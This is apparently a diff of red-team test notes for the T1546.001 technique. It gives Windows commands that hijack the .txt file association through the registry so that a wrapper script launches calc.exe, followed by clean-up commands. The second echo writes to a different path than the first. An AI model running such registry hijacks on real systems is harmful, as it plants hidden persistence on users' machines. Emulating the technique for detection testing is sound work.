@@ -1,19 +1,16 @@
+Event Triggered Execution: Change Default File Association (T1546.001)
 
-Event Triggered Execution: Change Default File Association
 
+CMD
 --------------------------------------------------
-
-
 echo start notepad.exe %1 >> %USERPROFILE%\Desktop\notepad.cmd
 echo start C:\Windows\System32\calc.exe >> notepad.cmd
 reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /d "%USERPROFILE%\Desktop\notepad.cmd" /f
-
---------------------------------------------------
 
 
 CLEAN UP
 del %USERPROFILE%\Desktop\notepad.cmd
 reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /d "%SystemRoot%\system32\NOTEPAD.EXE %1" /f
-
+--------------------------------------------------
 
 
